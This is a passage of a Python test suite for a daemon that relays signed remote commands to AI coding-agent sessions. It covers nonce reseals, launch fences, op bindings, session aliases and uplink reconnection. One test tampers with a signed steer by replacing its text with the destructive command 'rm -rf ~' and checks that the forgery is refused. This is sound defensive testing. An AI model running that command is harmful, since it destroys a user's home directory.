        self.assertEqual(self.outcome(again)["state"], "done")
        self.assertEqual(results(self.collect(), first["nonce"]), [], "nothing under the nonce the hub gave up")
        self.assertEqual(len(self.mod.ops("steer")), 1, "run once")
        self.assertEqual(self.ledger()[op]["nonce"], again["nonce"])
        self.r.plan = plan

        self.mod.hold = 1.5   # claimed, its command held at the bridge
        held = self.send_op("steer", {"session": self.bridged.sid, "text": "resealed after its claim"})
        op = held["opId"]
        self.assertTrue(wait_for(lambda: "at" in self.ledger().get(op, {}), 10), "claimed")
        self.assertNotIn("outcome", self.ledger()[op])
        later = self.send_op("steer", {"session": self.bridged.sid, "text": "resealed after its claim"}, op=op,
                             op_created=held["opCreated"])
        self.assertEqual(self.ledger()[op]["nonce"], later["nonce"], "the claim takes the latest nonce")
        self.assertEqual(self.outcome(later)["state"], "done")
        self.assertEqual(results(self.collect(), held["nonce"]), [])
        self.assertEqual(len(self.mod.ops("steer")), 2, "each op run once")

    def test_q_a_reseal_of_an_op_its_worker_then_refuses_is_answered_under_its_nonce(self):
        """Ticket 11a: the worker refuses the op inside `plan` (a live
        session is not resumed) after a reseal arrived: the refusal is kept
        under the reseal's nonce."""
        reached, gate = threading.Event(), threading.Event()
        plan = self.r.plan

        def paused(rpc, facts):
            reached.set()
            gate.wait(10)
            return plan(rpc, facts)

        self.r.plan = paused
        first = self.send_op("resume", {"session": self.plain.sid})
        self.assertTrue(reached.wait(10))
        again = self.send_op("resume", {"session": self.plain.sid}, op=first["opId"], op_created=first["opCreated"])
        gate.set()
        self.refused(again, "session-live")
        self.assertEqual(results(self.collect(), first["nonce"]), [])
        self.assertEqual(self.ledger()[first["opId"]]["nonce"], again["nonce"])

    def test_q_a_reseal_of_a_claim_awaiting_reconciliation_is_answered_under_its_nonce(self):
        """Ticket 11a: a claim a stop left, no trace of it yet, resealed after
        the restart: nothing runs again, and once its trace answers it, the
        outcome goes up under the reseal's nonce."""
        self.mod.turn = "t-q2"
        op, nonce, born = new_op(), codes.b64url(os.urandom(16)), iso(time.time())
        self.claim(op, "steer", self.bridged.sid, time.time(), nonce=nonce, op_created=rpcs.created_at(born))
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # the restart: its trace not there yet
        self.assertEqual(self.r.query(op), {"state": "in-progress"})
        reseal = self.send_op("steer", {"session": self.bridged.sid, "text": "landed before the stop"}, op=op,
                              op_created=born)
        self.assertEqual(self.ledger()[op]["nonce"], reseal["nonce"])
        self.assertNotIn("outcome", self.ledger()[op], "still the claim")
        landed = rpcs.steer(rpcs.bridge.endpoint(self.bridged.sid), "landed before the stop", op)
        self.assertEqual(self.reconciled(self.r, reseal["nonce"]), [landed], "reconciled once, under the reseal's nonce")
        self.assertEqual(results(self.r.opening(self.pid), nonce), [], "nothing under the nonce the hub gave up")
        self.assertEqual(len(self.mod.ops("steer")), 1, "the reseal ran nothing")

    def test_q_an_observers_refusal_reconciled_after_a_restart_reads_lane_b(self):
        """Ticket 11b: the bridge's child keeps an observer's refusal under
        the op; a daemon that stopped before it kept the outcome reads it
        back as `lane-b`, as `command()` answers it live, for every RPC whose
        answer the child keeps."""
        self.spawn_agent("aid00000000000q3", name="observed")
        self.mod.observer = True
        self.mod.turn = "t-q3"
        sid = self.bridged.sid
        asked = [self.send("steer", {"session": sid, "text": "x"}),
                 self.send("command", {"session": sid, "name": "rename", "args": "x"}),
                 self.send("btw", {"session": sid, "prompt": "why?"}),
                 self.send("stop-agent", {"session": sid, "agentId": "observed"}),
                 self.send("tell", {"session": sid, "agentId": "observed", "text": "hi"}),
                 self.upload()]
        for rpc in asked:
            self.refused(rpc, "lane-b")
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        entries = self.ledger()
        for rpc in asked:   # each claim as a stop before its outcome was kept leaves it
            n = rpc["nonce"]
            self.assertEqual(((rpcs.bridge.load_kept(sid).get("rpcs") or {}).get(n) or {}).get("code"), "lane-b", rpc["rpc"])
            entries[n] = {k: v for k, v in entries[n].items() if k not in ("outcome", "done_at", "acked")}
        sminos.write_json(path, entries)
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.frames = []
        for rpc in asked:
            o = self.refused(rpc, "lane-b")
            self.assertEqual(o["error"]["message"], "MAWS controls this session", rpc["rpc"])


    # ------------------------------------------------ a remote context (RL10, O12 M7)

    def remote_mode(self):
        """The RPCs as a machine cut over to its endpoint runs them (RL10):
        no code, every RPC carrying who sent it."""
        self.r = rpcs.Rpcs(None, "testhost", clock=lambda: self.clock[0], coded=False)

    def remote(self, name, args, launch=LAUNCH, member=MEMBER, device="dev-1", fingerprint="fp-1", op=None,
               op_created=None, nonce=None, **fields):
        """An authorized lane A action as the endpoint sends it down (O10 §D):
        DX6's Rpc with no code, its sender's member, device and the
        operation's fingerprint, and on a session its context naming
        `launch` (`context=False`: none at all)."""
        created = iso(time.time())
        rpc = {"rpc": name, "project": self.pid, "machine": "testhost", "member": member, "device": device,
               "created": created, "nonce": nonce or codes.b64url(os.urandom(16)), "opId": op or new_op(),
               "opCreated": op_created or created, "args": args, "fingerprint": fingerprint, **fields}
        if name != "spawn" and "context" not in fields:
            rpc["context"] = {"lane": "A", "session": args.get("session"), "launch": launch}
        if rpc.get("context") is False:
            del rpc["context"]
        self.r.receive(rpc, self.here)
        return rpc

    def binding(self, sid, member=MEMBER, fingerprint="fp-1"):
        return {"member": member, "device": "dev-1", "fingerprint": fingerprint,
                "target": {"kind": "session", "session": sid}}

    def test_r_a_remote_rpc_carries_its_launch_to_every_bridge_command(self):
        """O12 M7's fence: `plan` passes the context's launch on each bridge
        command it builds; the child refuses one sealed for another launch of
        the session (`launch`), before the mod sees anything and before an
        upload saves a file; under the session's own launch each runs."""
        self.remote_mode()
        self.mod.turn = "t-r1"
        self.spawn_agent("aid00000000000r1", name="fenced")
        sid = self.bridged.sid
        cases = [("steer", {"text": "x"}), ("interrupt", {}), ("model", {"model": "opus", "effort": "high"}),
                 ("compact", {}), ("command", {"name": "rename", "args": "x"}), ("btw", {"prompt": "why?"}),
                 ("tell", {"agentId": "fenced", "text": "hi"}), ("stop-agent", {"agentId": "fenced"}),
                 ("media", {"attachments": self.attachments(("shot.png", "image/png", PNG)),
                            "delivery": "queued-turn"})]
        for name, args in cases:
            with self.subTest(name, launch="stale"):
                before = len(self.mod.commands)
                o = self.refused(self.remote(name, {"session": sid, **args}, launch=STALE), "launch")
                self.assertIn(STALE, o["error"]["message"])
                self.assertEqual(self.mod.commands[before:], [], "nothing reached the mod")
        self.assertEqual(self.uploads_of(self.root), [], "an upload for another launch saved nothing")
        for name, args in cases:
            with self.subTest(name, launch="its own"):
                o = self.outcome(self.remote(name, {"session": sid, **args}))
                self.assertEqual(o["state"], "done", o)
        self.assertTrue(all("launch" not in c for c in self.mod.commands), "the child passes no launch to the mod")

    def test_r_a_remote_decision_carries_its_launch(self):
        """A decision and an answer take the same fence at the child's
        decision route: one sealed for another launch is refused `launch`
        and leaves the request pending; under the session's own it is
        taken."""
        self.remote_mode()
        sid = self.bridged.sid
        tool_input = {"command": "make fence"}
        self.mod.raise_("toolu_r2", input_=tool_input)
        wait_for(lambda: self.request_info("toolu_r2")[0] == 200)
        args = {"session": sid, "decision": "allow", "digest": digest_of(sid, "toolu_r2", "Bash", tool_input)}
        self.refused(self.remote("decide", args, launch=STALE), "launch")
        self.assertEqual(self.request_info("toolu_r2")[0], 200, "still pending: the stale decision was not taken")
        self.assertEqual(self.outcome(self.remote("decide", args)), {"state": "done", "result": {}})
        self.mod.settle("toolu_r2", outcome="allow", winner="web", by=MEMBER)
        q = {"questions": [{"question": "Which?", "options": [{"label": "A"}, {"label": "B"}]}]}
        self.mod.raise_("toolu_r3", tool="AskUserQuestion", input_=q)
        wait_for(lambda: self.request_info("toolu_r3")[0] == 200)
        answer = {"session": sid, "answers": {"Which?": "B"},
                  "digest": digest_of(sid, "toolu_r3", "AskUserQuestion", q)}
        self.refused(self.remote("answer", answer, launch=STALE), "launch")
        self.assertEqual(self.outcome(self.remote("answer", answer)), {"state": "done", "result": {}})
        self.mod.settle("toolu_r3", outcome="answered", winner="web", by=MEMBER)

    def test_r_a_remote_rpc_never_takes_a_path_around_the_bridge(self):
        """With a remote context nothing runs unfenced: a steer to a live
        session with no bridge is refused `context`, never the supervisor's
        reply or the inbox, and so is any other RPC with no bridge to fence
        it; resume, retire and stop, which O10 does not offer, are
        `unsupported`, a bridged stop too."""
        self.remote_mode()
        with mock.patch.object(rpcs, "steer_without_bridge", side_effect=AssertionError("unfenced")) as around, \
                mock.patch.object(rpcs, "retire", side_effect=AssertionError("retired")), \
                mock.patch.object(rpcs, "resume", side_effect=AssertionError("resumed")):
            o = self.refused(self.remote("steer", {"session": self.plain.sid, "text": "x"}), "context")
            self.assertIn("no bridge", o["error"]["message"])
            self.refused(self.remote("interrupt", {"session": self.plain.sid}), "context")
            self.refused(self.remote("resume", {"session": self.ended}), "unsupported")
            self.refused(self.remote("retire", {"session": self.plain.sid}), "unsupported")
            self.refused(self.remote("stop", {"session": self.bridged.sid, "taskId": "bremote1"}), "unsupported")
        around.assert_not_called()
        self.assertEqual(self.mod.ops("stop"), [], "the bridged stop never reached the bridge")

    def test_r_a_remote_rpc_on_a_session_without_its_context_is_bad_shape(self):
        """RL4: an action on a session carries its context, `{lane: 'A',
        session: args.session, launch}`; one without it, or naming another
        session, is refused `bad-shape` at admission and kept as its one
        answer."""
        self.remote_mode()
        self.mod.turn = "t-r4"
        sid = self.bridged.sid
        for what, context in (("none", False), ("another session", {"lane": "A", "session": self.plain.sid,
                                                                   "launch": LAUNCH}),
                              ("lane B", {"lane": "B", "session": sid, "launch": LAUNCH}),
                              ("no launch", {"lane": "A", "session": sid}),
                              ("not an object", "A")):
            with self.subTest(what):
                rpc = self.remote("steer", {"session": sid, "text": "x"}, context=context)
                self.refused(rpc, "bad-shape")
                self.assertIn("outcome", self.ledger()[rpc["opId"]], "kept as its one answer")
        self.assertEqual(self.mod.ops("steer"), [], "nothing reached the bridge")

    def test_r_the_binding_is_held_from_dispatch_on(self):
        """P1-4: the op's binding and latest nonce live in its in-flight
        record from dispatch on. With the worker inside `plan` (before its
        claim), a copy under another fingerprint, and one from another
        member, is refused `op-conflict`, loose, under its own nonce,
        revealing nothing of the op; an identical reseal under a new nonce
        is taken, and the op runs once, answered under the reseal's nonce
        and its opId. The same after the claim, and against the kept
        entry, where an identical copy is answered from the ledger."""
        self.remote_mode()
        self.mod.turn = "t-r5"
        sid = self.bridged.sid
        other = "fedcba9876543210fedcba9876543210"
        reached, gate = threading.Event(), threading.Event()
        plan = self.r.plan

        def paused(rpc, facts):   # the worker, between admission and its claim
            reached.set()
            gate.wait(10)
            return plan(rpc, facts)

        def conflicts(first):
            for copy in (self.remote("steer", {"session": sid, "text": "x"}, op=first["opId"],
                                     op_created=first["opCreated"], fingerprint="fp-2"),
                         self.remote("steer", {"session": sid, "text": "x"}, op=first["opId"],
                                     op_created=first["opCreated"], member=other)):
                o = self.refused(copy, "op-conflict")
                for stored in ("fp-1", MEMBER, "dev-1", first["nonce"]):
                    self.assertNotIn(stored, o["error"]["message"], "nothing of the stored op revealed")

        self.r.plan = paused
        first = self.remote("steer", {"session": sid, "text": "bound"})
        op = first["opId"]
        self.assertTrue(reached.wait(10))
        self.assertEqual({k: self.r.flight[op][k] for k in ("nonce", "member", "device", "fingerprint", "target")},
                         {"nonce": first["nonce"], **self.binding(sid)}, "held from dispatch on")
        conflicts(first)
        reseal = self.remote("steer", {"session": sid, "text": "bound"}, op=op, op_created=first["opCreated"])
        self.assertEqual(self.r.flight[op]["nonce"], reseal["nonce"], "an identical copy updates the nonce")
        self.assertEqual(self.r.flight[op]["fingerprint"], "fp-1", "and nothing of the binding")
        self.assertNotIn(op, self.ledger(), "no claim yet")
        gate.set()
        self.assertEqual(self.outcome(reseal)["state"], "done")
        self.assertEqual(results(self.collect(), first["nonce"]), [], "nothing under the first nonce")
        self.assertEqual([f["opId"] for f in self.frames if f.get("nonce") == reseal["nonce"]], [op])
        self.assertEqual(len(self.mod.ops("steer")), 1, "run once")
        self.assertEqual({k: self.ledger()[op][k] for k in ("nonce", "member", "device", "fingerprint", "target")},
                         {"nonce": reseal["nonce"], **self.binding(sid)}, "the claim built from the record")
        self.r.plan = plan

        self.mod.hold = 1.5   # claimed, its command held at the bridge
        held = self.remote("steer", {"session": sid, "text": "after its claim"})
        op = held["opId"]
        self.assertTrue(wait_for(lambda: "at" in self.ledger().get(op, {}), 10), "claimed")
        conflicts(held)
        later = self.remote("steer", {"session": sid, "text": "after its claim"}, op=op,
                            op_created=held["opCreated"])
        self.assertEqual(self.ledger()[op]["nonce"], later["nonce"], "the claim takes the latest nonce")
        self.assertEqual(self.outcome(later)["state"], "done")
        self.assertEqual(len(self.mod.ops("steer")), 2, "each op run once")

        self.mod.hold = 0.0   # answered: the kept entry is the binding
        conflicts(held)
        again = self.remote("steer", {"session": sid, "text": "after its claim"}, op=op,
                            op_created=held["opCreated"])
        self.assertEqual(self.outcome(again)["state"], "done", "an identical copy answered from the ledger")
        self.assertEqual(len(self.mod.ops("steer")), 2, "and run no more")

    def test_r_query_and_tombstone_answer_the_binding(self):
        """`query` and `tombstone` answer the op's binding (member, device,
        fingerprint, target), from its entry, or from its in-flight record
        before its claim; an entry an older daemon wrote answers without
        one, and a not-received op has none."""
        self.remote_mode()
        sid = self.bridged.sid
        tpr.set_policy({"read_only": True})
        kept = self.remote("interrupt", {"session": sid})
        self.refused(kept, "read-only")
        q = self.r.query(kept["opId"])
        self.assertEqual({k: v for k, v in q.items() if k != "outcome"}, {"state": "refused", **self.binding(sid)})
        self.assertEqual(self.r.tombstone(kept["opId"]), {"ok": False, "state": "refused", **self.binding(sid)})
        tpr.clear_policy()

        reached, gate = threading.Event(), threading.Event()
        plan = self.r.plan

        def paused(rpc, facts):
            reached.set()
            gate.wait(10)
            return plan(rpc, facts)

        self.r.plan = paused
        flying = self.remote("interrupt", {"session": sid}, fingerprint="fp-9")
        self.assertTrue(reached.wait(10))
        self.assertEqual(self.r.query(flying["opId"]), {"state": "in-progress", **self.binding(sid, fingerprint="fp-9")})
        self.assertEqual(self.r.tombstone(flying["opId"]),
                         {"ok": False, "state": "in-progress", **self.binding(sid, fingerprint="fp-9")})
        gate.set()
        self.assertEqual(self.outcome(flying)["state"], "done")
        self.r.plan = plan

        old, now = new_op(), time.time()
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        entries = self.ledger()
        entries[old] = {"project": self.pid, "rpc": "interrupt", "session": sid, "created": now, "at": now,
                        "nonce": codes.b64url(os.urandom(16)), "op_created": now, "outcome": rpcs.done({}),
                        "done_at": now, "acked": False}
        sminos.write_json(path, entries)
        self.remote_mode()
        self.assertEqual(self.r.query(old), {"state": "done", "outcome": rpcs.done({})}, "no binding to answer")
        self.assertEqual(self.r.query(new_op()), {"state": "not-received"})


class CopyNames(unittest.TestCase):
    """A seat-less session never takes, from its harness name, the alias of
    a seat or of another current member of its project: a `--bg` copy
    inherits its source's name (with `nameSource: user`), and the desk's
    Resume of 2026-10-19 picked such a copy for its seat. A name no live
    identity holds is taken as before, a retired member's included."""

    @classmethod
    def setUpClass(cls):
        cls.root, cls.pid = tpr.make_project("copynames")
        cls.project = tpr.project_of(cls.root)
        cls.sessions = []

    @classmethod
    def tearDownClass(cls):
        for s in cls.sessions:
            s.end()

    def session(self, name, source="user"):
        s = tpr.Session(self.root, inbox=False)
        self.sessions.append(s)
        self.rename(s, name, source)
        return s

    def rename(self, s, name, source="user"):
        with open(s.path) as f:
            rec = json.load(f)
        rec.update(name=name, nameSource=source)
        with open(s.path, "w") as f:
            json.dump(rec, f)
        sminos.forget_caches()

    def tick(self):
        """The daemon's reconciliation and its renames, as a tick runs them."""
        import sminos_daemon as daemon
        sminos.forget_caches()
        sminos.reconcile(self.project)
        sminos.forget_caches()
        return daemon.publish_renames(self.project, sminos.view_of(self.project, titles=False))

    def alias_of(self, sid):
        sminos.forget_caches()
        info = sminos.view_of(self.project, titles=False).info[sid]
        return (info["renamed"] or info["joined"])["alias"]

    def test_a_copy_does_not_take_a_stopped_seats_alias(self):
        seat = str(uuidlib.uuid4())
        sminos.meta_set(seat, {"uuid": seat, "current": seat, "alias": "acc-ask71", "group": "copynames",
                               "cwd": self.root, "status": "idle"})
        self.tick()
        self.assertEqual(self.alias_of(seat), "acc-ask71", "the seat is a member, stopped")
        # Joined before the engine named it, then named as its source: the
        # rename the desk's Resume took for the seat.
        copy = self.session("s-copy", "derived")
        self.tick()
        self.rename(copy, "acc-ask71")
        self.tick()
        self.assertEqual(self.alias_of(copy.sid), "s-copy", "no rename onto the seat's alias")
        self.assertEqual(tpr.member_of(self.project, copy.sid).alias, "s-copy", "nor goes by it")
        # Joined already named as its source: under its short id.
        born = self.session("acc-ask71")
        self.tick()
        self.assertEqual(self.alias_of(born.sid), born.sid[:8])
        self.assertEqual(self.tick(), 0, "and no rename follows")
        self.assertEqual(tpr.member_of(self.project, born.sid).alias, born.sid[:8])
        # What it signs with, read at hook time from its own file: the
        # address line its commits carry, and its say's sender.
        sminos.forget_caches()
        self.assertIn(": %s (" % born.sid[:8], sminos.session_address(born.sid, self.root))
        self.assertEqual(sminos._member_alias(self.project, born.sid, None, sminos._on_sight(
            self.project, born.sid)[1]), born.sid[:8])

    def test_b_a_copy_does_not_take_a_current_members_alias(self):
        first = self.session("pair-one")
        self.tick()
        self.assertEqual(self.alias_of(first.sid), "pair-one")
        second = self.session("pair-one")
        self.tick()
        self.assertEqual(self.alias_of(second.sid), second.sid[:8], "the member's alias stays its own")
        self.assertEqual(self.alias_of(first.sid), "pair-one")

    def test_c_a_name_no_live_identity_holds_is_taken(self):
        gone = self.session("was-here")
        self.tick()
        gone.end()
        self.sessions.remove(gone)
        self.tick()
        sminos.forget_caches()
        self.assertEqual(sminos.view_of(self.project, titles=False).info[gone.sid]["latest"]["kind"], "retired")
        again = self.session("was-here")
        self.tick()
        self.assertEqual(self.alias_of(again.sid), "was-here", "a retired member's name is free")
        fresh = self.session("s-fresh", "derived")
        self.tick()
        self.rename(fresh, "brand-new")
        self.tick()
        self.assertEqual(self.alias_of(fresh.sid), "brand-new", "a rename onto a free name is published")


class LaunchStart(unittest.TestCase):
    """When the engine's record carries no start, `launched_by` reads the
    process's own. On Linux `ps -o lstart` adds the start's offset to
    /proc/stat's boot time, truncated to the second: a process begun 0.2 s
    after the launch reads as begun the second before it, and a Resume
    refused its own job. A /proc stand-in reproduces such a boot (its true
    instant 0.7 s past the second btime names), with `ps` answering as it
    would."""

    PID = 4242
    JOB = "abcd1234"

    def setUp(self):
        self.proc = os.path.join(T, "proc-" + uuidlib.uuid4().hex[:8])
        os.makedirs(os.path.join(self.proc, str(self.PID)))
        self.hz = os.sysconf("SC_CLK_TCK")
        now = time.time()
        self.boot = int(now) - 3600 + 0.7
        self.launched = int(now) - 60 + 0.1
        with open(os.path.join(self.proc, "stat"), "w") as f:
            f.write("cpu  0 0 0 0\nbtime %d\n" % int(self.boot))
        with open(os.path.join(self.proc, "uptime"), "w") as f:
            f.write("%.2f 0.00\n" % (now - self.boot))
        self.ps = ""
        for patch in (mock.patch.object(sminos, "PROC", self.proc),
                      mock.patch.object(sminos, "read_proc_start", lambda pid: self.ps)):
            patch.start()
            self.addCleanup(patch.stop)

    def began(self, at):
        """The process began at `at`: its /proc/<pid>/stat (a command name
        with spaces and parentheses in it), and what ps prints for it."""
        ticks = int((at - self.boot) * self.hz)
        with open(os.path.join(self.proc, str(self.PID), "stat"), "w") as f:
            f.write("%d (claude (bg) x) S 1 %d %d 0 -1 4194560 0 0 0 0 0 0 0 0 20 0 1 0 %d 0 0\n"
                    % (self.PID, self.PID, self.PID, ticks))
        ps_second = int(self.boot) + ticks // self.hz
        self.ps = time.strftime("%a %b %d %H:%M:%S %Y", time.localtime(ps_second))
        return ps_second

    def holder(self, job=JOB):
        return {"pid": self.PID, "sessionId": str(uuidlib.uuid4()), "kind": "bg", "jobId": job}

    def test_its_own_job_begun_just_after_the_launch_holds(self):
        ps_second = self.began(self.launched + 0.2)
        self.assertLess(ps_second, int(self.launched), "the reproduction: ps reads the second before the launch")
        self.assertTrue(rpcs.launched_by(self.holder(), self.launched, self.JOB))

    def test_no_other_job_and_no_earlier_process_is_taken(self):
        self.began(self.launched + 0.2)
        self.assertFalse(rpcs.launched_by(self.holder("ffff0000"), self.launched, self.JOB), "another job")
        self.began(self.launched - 1.5)
        self.assertFalse(rpcs.launched_by(self.holder(), self.launched, self.JOB), "begun before the launch")

    def test_without_proc_ps_decides(self):
        os.unlink(os.path.join(self.proc, "uptime"))
        self.began(self.launched + 2)
        self.assertTrue(rpcs.launched_by(self.holder(), self.launched, self.JOB))
        self.began(self.launched - 2)
        self.assertFalse(rpcs.launched_by(self.holder(), self.launched, self.JOB))


# ---------------------------------------------------------------- the uplink


class Uplink(unittest.TestCase):
    """RPCs through the uplink's stream: against the hub stand-in, or DC3's
    local hub when DESK_HUB names its stand-in for Access."""

    @classmethod
    def setUpClass(cls):
        cls.procs = []
        cls.claude = install_claude("uplink")
        os.environ["SMINOS_DERIVE_EVERY"] = "0"
        cls.hub = tsp.make_hub(cls.spawn)
        cls.hub.enroll(CLI)
        with open(os.path.join(os.environ["SMINOS_HOME"], "daemon", "hub.json")) as f:
            cls.key = codes.b64url_bytes(json.load(f)["key"], 32)
        cls.root, cls.pid = tpr.make_project("rpcup", cls.hub.url, cls.hub.org)
        subprocess.run(GIT + ["-C", cls.root, "commit", "-q", "--allow-empty", "-m", "base"], check=True)
        cls.session = tpr.Session(cls.root)
        cls.sid = cls.session.sid
        cls.mod = Mod(cls.sid)
        r = cli("daemon", "tick")
        assert r.returncode == 0, r.stderr
        cls.uplink = cls.spawn([CLI, "daemon", "uplink"])
        cls.hub.follow(cls.pid)
        ok = cls.hub.wait(lambda ms: any(m["kind"] == "presence" and m["session"] == cls.sid
                                         and m["body"]["bridge"] for m in ms), timeout=30)
        assert ok is not None, "the uplink connected and said the session's bridge"
        cls.member = MEMBER
        if cls.local():
            cls.member = next(f["member"] for f in cls.hub.socket.received() if f.get("t") == "welcome")

    @classmethod
    def spawn(cls, argv):
        p = subprocess.Popen(argv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cls.procs.append(p)
        return p

    @classmethod
    def tearDownClass(cls):
        tpr.clear_policy()
        cls.mod.stop()
        if cls.local():
            cls.hub.close()
        for p in reversed(cls.procs):
            if p.poll() is None:
                p.terminate()
        for p in cls.procs:
            p.wait(10)
        cls.session.end()
        stop_holders(cls.claude)

    def setUp(self):
        tpr.clear_policy()
        self.mod.turn = None
        self.mod.hold = 0.0

    @classmethod
    def local(cls):
        return isinstance(cls.hub, tsp.LocalHub)

    def rpc(self, name, args, **kw):
        return sign(self.key, name, self.pid, args, machine=kw.pop("machine", self.hub.machine),
                    member=self.member, **kw)

    def send(self, rpc):
        if self.local():
            self.hub.socket.send({"t": "rpc", "rpc": rpc})
        else:
            self.hub.send({"t": "rpc", "rpc": rpc})
        return rpc

    def posted(self, nonce):
        """(generation, outcome) of each `rpc-result` the uplink posted for
        the nonce and the stand-in took (200)."""
        out = []
        for p in self.hub.state()["posted"]:
            if p["status"] != 200:
                continue
            for line in p["body"].splitlines():
                f = json.loads(line) if line.strip() else {}
                if f.get("t") == "rpc-result" and f.get("nonce") == nonce:
                    out.append((int(p["generation"]), f["outcome"]))
        return out

    def states(self, nonce):
        """The local hub's record of the RPC, as its browser was shown it:
        (state, outcome) in order."""
        return [(f["state"], f.get("outcome")) for f in self.hub.socket.received()
                if f.get("t") == "rpc-state" and f.get("nonce") == nonce]

    def outcome(self, rpc, timeout=30.0):
        """The RPC's outcome as the hub has it."""
        def got():
            if self.local():
                final = [o for s, o in self.states(rpc["nonce"]) if s in ("done", "failed")]
            else:
                final = [o for _, o in self.posted(rpc["nonce"])]
            return final[-1] if final else None
        o = wait_for(got, timeout)
        self.assertIsNotNone(o, "the hub has %s's result" % rpc["rpc"])
        return o

    def ack(self, rpc):
        if not self.local():
            self.hub.send({"t": "rpc-ack", "project": self.pid, "nonce": rpc["nonce"]})

    def reconnected(self, since):
        """Whether the uplink's stream after `since` is open (it said its
        presence again)."""
        return self.hub.wait(lambda ms: [m for m in ms[since:] if m["kind"] == "presence" and m["session"] == self.sid],
                             timeout=30)

    def test_a_steer_and_its_refusals_reach_the_hub(self):
        self.mod.turn = "turn-a"
        steer = self.send(self.rpc("steer", {"session": self.sid, "text": "look at the failing test first"}))
        o = self.outcome(steer)
        self.assertEqual(o, {"state": "done", "result": {"row": self.mod.rows[-1]}})
        forged = self.rpc("steer", {"session": self.sid, "text": "push to main"})
        forged["args"]["text"] = "rm -rf ~"
        o = self.outcome(self.send(forged))
        self.assertEqual(o["error"]["code"], "bad-code", "refused and reported")
        self.assertNotIn("rm -rf ~", [c.get("text") for c in self.mod.ops("steer")])
        tpr.set_policy({"read_only": True})
        o = self.outcome(self.send(self.rpc("interrupt", {"session": self.sid})))
        self.assertEqual(o["error"]["code"], "read-only")
        tpr.clear_policy()
        if not self.local():
            # The hub routes by the machine an RPC names; only a hub that lies
            # sends another machine's here, and only the stand-in can.
            o = self.outcome(self.send(self.rpc("interrupt", {"session": self.sid}, machine="mini")))
            self.assertEqual(o["error"]["code"], "wrong-machine")
            self.assertEqual(self.mod.ops("interrupt"), [])
            # Republished on every connect until acknowledged.
            count = len(self.hub.messages())
            self.hub.drop()
            self.assertIsNotNone(self.reconnected(count))
            self.assertIsNotNone(wait_for(lambda: len(self.posted(steer["nonce"])) >= 2, 15), "sent again")
            self.ack(steer)
            time.sleep(0.5)
            sent = len(self.posted(steer["nonce"]))
            count = len(self.hub.messages())
            self.hub.drop()
            self.assertIsNotNone(self.reconnected(count))
            time.sleep(1.0)
            self.assertEqual(len(self.posted(steer["nonce"])), sent, "acknowledged: not sent again")

    def test_b_a_cut_after_execution_shows_uncertain_then_resolves_executed_once(self):
        self.mod.turn = "turn-b"
        self.mod.hold = 3.0
        before = len(self.mod.ops("steer"))
        steer = self.send(self.rpc("steer", {"session": self.sid, "text": "keep the old column name"}))
        self.assertTrue(wait_for(lambda: len(self.mod.ops("steer")) > before, 15), "it reached the session")
        count = len(self.hub.messages())
        self.hub.drop()
        if self.local():
            self.assertTrue(wait_for(lambda: "uncertain" in [s for s, _ in self.states(steer["nonce"])], 15),
                            "uncertain on the hub while the machine is away: %s" % self.states(steer["nonce"]))
        self.assertIsNotNone(self.reconnected(count))
        o = self.outcome(steer)
        self.assertEqual(o, {"state": "done", "result": {"row": self.mod.rows[-1]}}, "then resolved")
        self.assertEqual(len(self.mod.ops("steer")) - before, 1, "executed once")
        self.ack(steer)

    def restart_uplink(self):
        old = Uplink.uplink
        old.send_signal(signal.SIGKILL)
        old.wait(10)
        count = len(self.hub.messages())
        Uplink.uplink = self.spawn([CLI, "daemon", "uplink"])
        self.assertIsNotNone(self.reconnected(count), "the new uplink is connected")

    def test_c_a_restart_between_execution_and_report_resolves_executed_once(self):
        # Killed after the claim, while the session runs the steer: the new
        # uplink finds the mod's answer, which the bridge's child kept under
        # the steer's nonce.
        self.mod.turn = "turn-c"
        self.mod.hold = 2.0
        before = len(self.mod.ops("steer"))
        steer = self.send(self.rpc("steer", {"session": self.sid, "text": "and the migration"}))
        self.assertTrue(wait_for(lambda: len(self.mod.ops("steer")) > before, 15), "it reached the session")
        self.restart_uplink()
        if self.local():
            self.assertIn("uncertain", [s for s, _ in self.states(steer["nonce"])], "uncertain while it was away")
        o = self.outcome(steer, timeout=45)
        self.assertEqual(o, {"state": "done", "result": {"row": self.mod.rows[-1]}}, "reconciled from its trace")
        self.assertEqual(len(self.mod.ops("steer")) - before, 1, "executed once")
        self.ack(steer)
        if not self.local():
            # Killed after the outcome was kept, its report held by the hub:
            # the new uplink sends it after its hello.
            self.mod.hold = 0.0
            self.mod.turn = "turn-c2"
            tsp.call(self.hub.url, "POST", "/control/post-fault", {"faults": [{"fault": "hold", "has": "rpc-result"}]})
            n = len(self.mod.ops("interrupt"))
            intr = self.send(self.rpc("interrupt", {"session": self.sid}))
            self.assertTrue(wait_for(lambda: [p for p in self.hub.state()["posted"] if p["status"] == "held"], 15),
                            "the report reached the hub and is held there")
            self.restart_uplink()
            tsp.call(self.hub.url, "POST", "/control/release", {})
            o = self.outcome(intr)
            self.assertEqual(o["result"]["turnId"], "turn-c2")
            self.assertEqual(len(self.mod.ops("interrupt")) - n, 1, "executed once")
            self.ack(intr)

    def test_d_a_spawn_retried_with_its_nonce_after_a_cut_yields_one_session(self):
        with open(os.path.join(self.claude, "bg-sleep"), "w") as f:
            f.write("3")
        try:
            before = len(launches(self.claude))
            spawn = self.send(self.rpc("spawn", {"checkout": self.root, "brief": "write the release notes"}))
            self.assertTrue(wait_for(lambda: len(launches(self.claude)) > before, 30), "the launch began")
            count = len(self.hub.messages())
            self.hub.drop()
            self.assertIsNotNone(self.reconnected(count))
            o = self.outcome(spawn, timeout=60)
            self.assertEqual(o["state"], "done", o)
            self.send(spawn)  # the browser's retry, with its nonce
            if self.local():
                self.assertTrue(wait_for(lambda: len([s for s, _ in self.states(spawn["nonce"]) if s == "done"]) >= 2,
                                         15), "answered again: %s" % self.states(spawn["nonce"]))
            else:
                self.assertTrue(wait_for(lambda: len(self.posted(spawn["nonce"])) >= 2, 15), "answered again")
            self.assertEqual(self.outcome(spawn), o, "the same answer")
            time.sleep(1.0)
            self.assertEqual(len(launches(self.claude)) - before, 1, "one launch")
            self.assertEqual([s["current"] for s in sminos.seats() if s.get("rpc_nonce") == spawn["nonce"]],
